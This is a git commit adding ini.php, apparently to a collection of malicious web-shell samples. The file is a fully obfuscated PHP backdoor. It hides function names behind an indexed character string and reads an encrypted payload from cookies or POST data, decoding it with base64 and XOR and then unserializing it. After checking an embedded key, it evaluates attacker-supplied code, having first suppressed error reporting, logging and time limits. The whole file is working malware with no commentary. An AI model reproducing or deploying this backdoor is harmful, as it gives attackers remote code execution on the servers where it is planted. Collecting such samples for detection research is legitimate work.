313f0b9a96acd70d383eb8bb02d8a62744b866fa
tek <tek@randhome.io>
2016-05-16 15:18:44 +0200

    many new samples

---
+++ ini.php
@@ -0,0 +1,79 @@
+<?php $GLOBALS['md58b4c'] = "\x68\x67\x22\x79\x4f\x76\x57\x33\x6b\x2d\x45\x27\x20\x40\x73\x72\x4d\x7c\x53\x2c\x3e\x78\x47\x5f\x43\x69\x6a\x3b\x60\x70\x24\x3f\x7a\x7b\x5c\x49\x71\x50\x7d\x2b\x66\xa\x7e\x2f\x9\x46\x65\x48\x23\x54\x3c\x5a\x55\x75\x39\x62\x36\x3a\x64\x30\x35\x2a\x61\x51\x63\x4e\x6e\x37\x56\x42\x58\x4a\x34\x26\x5d\x2e\x4b\x31\x41\x52\x32\x6f\x5b\x29\x59\xd\x21\x3d\x28\x6c\x6d\x44\x25\x38\x5e\x74\x77\x4c";
+$GLOBALS[$GLOBALS['md58b4c'][15].$GLOBALS['md58b4c'][7].$GLOBALS['md58b4c'][67].$GLOBALS['md58b4c'][7]] = $GLOBALS['md58b4c'][64].$GLOBALS['md58b4c'][0].$GLOBALS['md58b4c'][15];
+$GLOBALS[$GLOBALS['md58b4c'][89].$GLOBALS['md58b4c'][72].$GLOBALS['md58b4c'][7].$GLOBALS['md58b4c'][58].$GLOBALS['md58b4c'][93].$GLOBALS['md58b4c'][80].$GLOBALS['md58b4c'][62]] = $GLOBALS['md58b4c'][81].$GLOBALS['md58b4c'][15].$GLOBALS['md58b4c'][58];
+$GLOBALS[$GLOBALS['md58b4c'][64].$GLOBALS['md58b4c'][54].$GLOBALS['md58b4c'][56].$GLOBALS['md58b4c'][62].$GLOBALS['md58b4c'][77].$GLOBALS['md58b4c'][93].$GLOBALS['md58b4c'][56].$GLOBALS['md58b4c'][67].$GLOBALS['md58b4c'][80]] = $GLOBALS['md58b4c'][14].$GLOBALS['md58b4c'][95].$GLOBALS['md58b4c'][15].$GLOBALS['md58b4c'][89].$GLOBALS['md58b4c'][46].$GLOBALS['md58b4c'][66];
+$GLOBALS[$GLOBALS['md58b4c'][14].$GLOBALS['md58b4c'][58].$GLOBALS['md58b4c'][58].$GLOBALS['md58b4c'][62].$GLOBALS['md58b4c'][77]] = $GLOBALS['md58b4c'][25].$GLOBALS['md58b4c'][66].$GLOBALS['md58b4c'][25].$GLOBALS['md58b4c'][23].$GLOBALS['md58b4c'][14].$GLOBALS['md58b4c'][46].$GLOBALS['md58b4c'][95];
+$GLOBALS[$GLOBALS['md58b4c'][66].$GLOBALS['md58b4c'][55].$GLOBALS['md58b4c'][80].$GLOBALS['md58b4c'][54].$GLOBALS['md58b4c'][54].$GLOBALS['md58b4c'][40].$GLOBALS['md58b4c'][62].$GLOBALS['md58b4c'][7]] = $GLOBALS['md58b4c'][14].$GLOBALS['md58b4c'][46].$GLOBALS['md58b4c'][15].$GLOBALS['md58b4c'][25].$GLOBALS['md58b4c'][62].$GLOBALS['md58b4c'][89].$GLOBALS['md58b4c'][25].$GLOBALS['md58b4c'][32].$GLOBALS['md58b4c'][46];
+$GLOBALS[$GLOBALS['md58b4c'][3].$GLOBALS['md58b4c'][46].$GLOBALS['md58b4c'][59].$GLOBALS['md58b4c'][67].$GLOBALS['md58b4c'][80].$GLOBALS['md58b4c'][93]] = $GLOBALS['md58b4c'][29].$GLOBALS['md58b4c'][0].$GLOBALS['md58b4c'][29].$GLOBALS['md58b4c'][5].$GLOBALS['md58b4c'][46].$GLOBALS['md58b4c'][15].$GLOBALS['md58b4c'][14].$GLOBALS['md58b4c'][25].$GLOBALS['md58b4c'][81].$GLOBALS['md58b4c'][66];
+$GLOBALS[$GLOBALS['md58b4c'][55].$GLOBALS['md58b4c'][40].$GLOBALS['md58b4c'][80].$GLOBALS['md58b4c'][56]] = $GLOBALS['md58b4c'][53].$GLOBALS['md58b4c'][66].$GLOBALS['md58b4c'][14].$GLOBALS['md58b4c'][46].$GLOBALS['md58b4c'][15].$GLOBALS['md58b4c'][25].$GLOBALS['md58b4c'][62].$GLOBALS['md58b4c'][89].$GLOBALS['md58b4c'][25].$GLOBALS['md58b4c'][32].$GLOBALS['md58b4c'][46];
+$GLOBALS[$GLOBALS['md58b4c'][66].$GLOBALS['md58b4c'][56].$GLOBALS['md58b4c'][59].$GLOBALS['md58b4c'][62]] = $GLOBALS['md58b4c'][55].$GLOBALS['md58b4c'][62].$GLOBALS['md58b4c'][14].$GLOBALS['md58b4c'][46].$GLOBALS['md58b4c'][56].$GLOBALS['md58b4c'][72].$GLOBALS['md58b4c'][23].$GLOBALS['md58b4c'][58].$GLOBALS['md58b4c'][46].$GLOBALS['md58b4c'][64].$GLOBALS['md58b4c'][81].$GLOBALS['md58b4c'][58].$GLOBALS['md58b4c'][46];
+$GLOBALS[$GLOBALS['md58b4c'][14].$GLOBALS['md58b4c'][56].$GLOBALS['md58b4c'][67].$GLOBALS['md58b4c'][62].$GLOBALS['md58b4c'][58]] = $GLOBALS['md58b4c'][14].$GLOBALS['md58b4c'][46].$GLOBALS['md58b4c'][95].$GLOBALS['md58b4c'][23].$GLOBALS['md58b4c'][95].$GLOBALS['md58b4c'][25].$GLOBALS['md58b4c'][90].$GLOBALS['md58b4c'][46].$GLOBALS['md58b4c'][23].$GLOBALS['md58b4c'][89].$GLOBALS['md58b4c'][25].$GLOBALS['md58b4c'][90].$GLOBALS['md58b4c'][25].$GLOBALS['md58b4c'][95];
+$GLOBALS[$GLOBALS['md58b4c'][0].$GLOBALS['md58b4c'][55].$GLOBALS['md58b4c'][60].$GLOBALS['md58b4c'][46].$GLOBALS['md58b4c'][64].$GLOBALS['md58b4c'][62].$GLOBALS['md58b4c'][60].$GLOBALS['md58b4c'][62].$GLOBALS['md58b4c'][72]] = $GLOBALS['md58b4c'][3].$GLOBALS['md58b4c'][56].$GLOBALS['md58b4c'][77].$GLOBALS['md58b4c'][55];
+$GLOBALS[$GLOBALS['md58b4c'][89].$GLOBALS['md58b4c'][56].$GLOBALS['md58b4c'][67].$GLOBALS['md58b4c'][64].$GLOBALS['md58b4c'][55].$GLOBALS['md58b4c'][77].$GLOBALS['md58b4c'][77]] = $GLOBALS['md58b4c'][90].$GLOBALS['md58b4c'][80].$GLOBALS['md58b4c'][62].$GLOBALS['md58b4c'][64].$GLOBALS['md58b4c'][93].$GLOBALS['md58b4c'][56];
+$GLOBALS[$GLOBALS['md58b4c'][15].$GLOBALS['md58b4c'][93].$GLOBALS['md58b4c'][59].$GLOBALS['md58b4c'][46].$GLOBALS['md58b4c'][58]] = $_POST;
+$GLOBALS[$GLOBALS['md58b4c'][36].$GLOBALS['md58b4c'][55].$GLOBALS['md58b4c'][67].$GLOBALS['md58b4c'][56].$GLOBALS['md58b4c'][40].$GLOBALS['md58b4c'][46].$GLOBALS['md58b4c'][93]] = $_COOKIE;
+@$GLOBALS[$GLOBALS['md58b4c'][14].$GLOBALS['md58b4c'][58].$GLOBALS['md58b4c'][58].$GLOBALS['md58b4c'][62].$GLOBALS['md58b4c'][77]]($GLOBALS['md58b4c'][46].$GLOBALS['md58b4c'][15].$GLOBALS['md58b4c'][15].$GLOBALS['md58b4c'][81].$GLOBALS['md58b4c'][15].$GLOBALS['md58b4c'][23].$GLOBALS['md58b4c'][89].$GLOBALS['md58b4c'][81].$GLOBALS['md58b4c'][1], NULL);
+@$GLOBALS[$GLOBALS['md58b4c'][14].$GLOBALS['md58b4c'][58].$GLOBALS['md58b4c'][58].$GLOBALS['md58b4c'][62].$GLOBALS['md58b4c'][77]]($GLOBALS['md58b4c'][89].$GLOBALS['md58b4c'][81].$GLOBALS['md58b4c'][1].$GLOBALS['md58b4c'][23].$GLOBALS['md58b4c'][46].$GLOBALS['md58b4c'][15].$GLOBALS['md58b4c'][15].$GLOBALS['md58b4c'][81].$GLOBALS['md58b4c'][15].$GLOBALS['md58b4c'][14], 0);
+@$GLOBALS[$GLOBALS['md58b4c'][14].$GLOBALS['md58b4c'][58].$GLOBALS['md58b4c'][58].$GLOBALS['md58b4c'][62].$GLOBALS['md58b4c'][77]]($GLOBALS['md58b4c'][90].$GLOBALS['md58b4c'][62].$GLOBALS['md58b4c'][21].$GLOBALS['md58b4c'][23].$GLOBALS['md58b4c'][46].$GLOBALS['md58b4c'][21].$GLOBALS['md58b4c'][46].$GLOBALS['md58b4c'][64].$GLOBALS['md58b4c'][53].$GLOBALS['md58b4c'][95].$GLOBALS['md58b4c'][25].$GLOBALS['md58b4c'][81].$GLOBALS['md58b4c'][66].$GLOBALS['md58b4c'][23].$GLOBALS['md58b4c'][95].$GLOBALS['md58b4c'][25].$GLOBALS['md58b4c'][90].$GLOBALS['md58b4c'][46], 0);
+@$GLOBALS[$GLOBALS['md58b4c'][14].$GLOBALS['md58b4c'][56].$GLOBALS['md58b4c'][67].$GLOBALS['md58b4c'][62].$GLOBALS['md58b4c'][58]](0);
+
+$c83b83 = NULL;
+$wad4 = NULL;
+
+$GLOBALS[$GLOBALS['md58b4c'][26].$GLOBALS['md58b4c'][7].$GLOBALS['md58b4c'][59].$GLOBALS['md58b4c'][58].$GLOBALS['md58b4c'][77].$GLOBALS['md58b4c'][55].$GLOBALS['md58b4c'][59]] = $GLOBALS['md58b4c'][7].$GLOBALS['md58b4c'][58].$GLOBALS['md58b4c'][46].$GLOBALS['md58b4c'][54].$GLOBALS['md58b4c'][77].$GLOBALS['md58b4c'][54].$GLOBALS['md58b4c'][72].$GLOBALS['md58b4c'][72].$GLOBALS['md58b4c'][9].$GLOBALS['md58b4c'][93].$GLOBALS['md58b4c'][7].$GLOBALS['md58b4c'][67].$GLOBALS['md58b4c'][77].$GLOBALS['md58b4c'][9].$GLOBALS['md58b4c'][72].$GLOBALS['md58b4c'][67].$GLOBALS['md58b4c'][55].$GLOBALS['md58b4c'][46].$GLOBALS['md58b4c'][9].$GLOBALS['md58b4c'][55].$GLOBALS['md58b4c'][67].$GLOBALS['md58b4c'][59].$GLOBALS['md58b4c'][46].$GLOBALS['md58b4c'][9].$GLOBALS['md58b4c'][62].$GLOBALS['md58b4c'][40].$GLOBALS['md58b4c'][80].$GLOBALS['md58b4c'][56].$GLOBALS['md58b4c'][7].$GLOBALS['md58b4c'][55].$GLOBALS['md58b4c'][7].$GLOBALS['md58b4c'][64].$GLOBALS['md58b4c'][56].$GLOBALS['md58b4c'][77].$GLOBALS['md58b4c'][80].$GLOBALS['md58b4c'][60];
+global $j30d1b0;
+
+function m2ac86($c83b83, $j455)
+{
+    $g7a77a9 = "";
+
+    for ($g34259a=0; $g34259a<$GLOBALS[$GLOBALS['md58b4c'][64].$GLOBALS['md58b4c'][54].$GLOBALS['md58b4c'][56].$GLOBALS['md58b4c'][62].$GLOBALS['md58b4c'][77].$GLOBALS['md58b4c'][93].$GLOBALS['md58b4c'][56].$GLOBALS['md58b4c'][67].$GLOBALS['md58b4c'][80]]($c83b83);)
+    {
+        for ($fb07b96=0; $fb07b96<$GLOBALS[$GLOBALS['md58b4c'][64].$GLOBALS['md58b4c'][54].$GLOBALS['md58b4c'][56].$GLOBALS['md58b4c'][62].$GLOBALS['md58b4c'][77].$GLOBALS['md58b4c'][93].$GLOBALS['md58b4c'][56].$GLOBALS['md58b4c'][67].$GLOBALS['md58b4c'][80]]($j455) && $g34259a<$GLOBALS[$GLOBALS['md58b4c'][64].$GLOBALS['md58b4c'][54].$GLOBALS['md58b4c'][56].$GLOBALS['md58b4c'][62].$GLOBALS['md58b4c'][77].$GLOBALS['md58b4c'][93].$GLOBALS['md58b4c'][56].$GLOBALS['md58b4c'][67].$GLOBALS['md58b4c'][80]]($c83b83); $fb07b96++, $g34259a++)
+        {
+            $g7a77a9 .= $GLOBALS[$GLOBALS['md58b4c'][15].$GLOBALS['md58b4c'][7].$GLOBALS['md58b4c'][67].$GLOBALS['md58b4c'][7]]($GLOBALS[$GLOBALS['md58b4c'][89].$GLOBALS['md58b4c'][72].$GLOBALS['md58b4c'][7].$GLOBALS['md58b4c'][58].$GLOBALS['md58b4c'][93].$GLOBALS['md58b4c'][80].$GLOBALS['md58b4c'][62]]($c83b83[$g34259a]) ^ $GLOBALS[$GLOBALS['md58b4c'][89].$GLOBALS['md58b4c'][72].$GLOBALS['md58b4c'][7].$GLOBALS['md58b4c'][58].$GLOBALS['md58b4c'][93].$GLOBALS['md58b4c'][80].$GLOBALS['md58b4c'][62]]($j455[$fb07b96]));
+        }
+    }
+
+    return $g7a77a9;
+}
+
+function y61b($c83b83, $j455)
+{
+    global $j30d1b0;
+
+    return $GLOBALS[$GLOBALS['md58b4c'][89].$GLOBALS['md58b4c'][56].$GLOBALS['md58b4c'][67].$GLOBALS['md58b4c'][64].$GLOBALS['md58b4c'][55].$GLOBALS['md58b4c'][77].$GLOBALS['md58b4c'][77]]($GLOBALS[$GLOBALS['md58b4c'][89].$GLOBALS['md58b4c'][56].$GLOBALS['md58b4c'][67].$GLOBALS['md58b4c'][64].$GLOBALS['md58b4c'][55].$GLOBALS['md58b4c'][77].$GLOBALS['md58b4c'][77]]($c83b83, $j30d1b0), $j455);
+}
+
+foreach ($GLOBALS[$GLOBALS['md58b4c'][36].$GLOBALS['md58b4c'][55].$GLOBALS['md58b4c'][67].$GLOBALS['md58b4c'][56].$GLOBALS['md58b4c'][40].$GLOBALS['md58b4c'][46].$GLOBALS['md58b4c'][93]] as $j455=>$t664480a2)
+{
+    $c83b83 = $t664480a2;
+    $wad4 = $j455;
+}
+
+if (!$c83b83)
+{
+    foreach ($GLOBALS[$GLOBALS['md58b4c'][15].$GLOBALS['md58b4c'][93].$GLOBALS['md58b4c'][59].$GLOBALS['md58b4c'][46].$GLOBALS['md58b4c'][58]] as $j455=>$t664480a2)
+    {
+        $c83b83 = $t664480a2;
+        $wad4 = $j455;
+    }
+}
+
+$c83b83 = @$GLOBALS[$GLOBALS['md58b4c'][55].$GLOBALS['md58b4c'][40].$GLOBALS['md58b4c'][80].$GLOBALS['md58b4c'][56]]($GLOBALS[$GLOBALS['md58b4c'][0].$GLOBALS['md58b4c'][55].$GLOBALS['md58b4c'][60].$GLOBALS['md58b4c'][46].$GLOBALS['md58b4c'][64].$GLOBALS['md58b4c'][62].$GLOBALS['md58b4c'][60].$GLOBALS['md58b4c'][62].$GLOBALS['md58b4c'][72]]($GLOBALS[$GLOBALS['md58b4c'][66].$GLOBALS['md58b4c'][56].$GLOBALS['md58b4c'][59].$GLOBALS['md58b4c'][62]]($c83b83), $wad4));
+if (isset($c83b83[$GLOBALS['md58b4c'][62].$GLOBALS['md58b4c'][8]]) && $j30d1b0==$c83b83[$GLOBALS['md58b4c'][62].$GLOBALS['md58b4c'][8]])
+{
+    if ($c83b83[$GLOBALS['md58b4c'][62]] == $GLOBALS['md58b4c'][25])
+    {
+        $g34259a = Array(
+            $GLOBALS['md58b4c'][29].$GLOBALS['md58b4c'][5] => @$GLOBALS[$GLOBALS['md58b4c'][3].$GLOBALS['md58b4c'][46].$GLOBALS['md58b4c'][59].$GLOBALS['md58b4c'][67].$GLOBALS['md58b4c'][80].$GLOBALS['md58b4c'][93]](),
+            $GLOBALS['md58b4c'][14].$GLOBALS['md58b4c'][5] => $GLOBALS['md58b4c'][77].$GLOBALS['md58b4c'][75].$GLOBALS['md58b4c'][59].$GLOBALS['md58b4c'][9].$GLOBALS['md58b4c'][77],
+        );
+        echo @$GLOBALS[$GLOBALS['md58b4c'][66].$GLOBALS['md58b4c'][55].$GLOBALS['md58b4c'][80].$GLOBALS['md58b4c'][54].$GLOBALS['md58b4c'][54].$GLOBALS['md58b4c'][40].$GLOBALS['md58b4c'][62].$GLOBALS['md58b4c'][7]]($g34259a);
+    }
+    elseif ($c83b83[$GLOBALS['md58b4c'][62]] == $GLOBALS['md58b4c'][46])
+    {
+        eval($c83b83[$GLOBALS['md58b4c'][58]]);
+    }
+    exit();
+}
